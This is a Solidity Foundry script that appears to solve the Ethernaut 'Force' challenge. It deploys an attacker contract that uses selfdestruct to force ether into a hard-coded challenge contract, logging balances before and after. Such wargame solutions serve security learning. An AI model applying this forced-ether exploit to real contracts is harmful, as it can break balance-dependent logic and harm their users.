//SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script} from "lib/forge-std/src/Script.sol";
import {Force} from "src/ethernaut7.sol";
import {console} from "lib/forge-std/src/console.sol";

contract ethernaut7Script is Script{
    Force instance = Force(0x47e493198B1Bc27540c5BE455cf64806d1B62b17);
    function run() public{
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        
    Attacker attacker = new Attacker();
        console.log("balance: ", address(instance).balance);
        payable(attacker).transfer(1 wei);
        console.log("balance: ", address(attacker).balance);
        attacker.selfdest(address(instance));
        console.log("balance: ", address(instance).balance);

        vm.stopBroadcast();
    }
}
contract Attacker {
    function selfdest(address _target) public payable {
        selfdestruct(payable(_target));
    }

    receive() external payable{ }
}
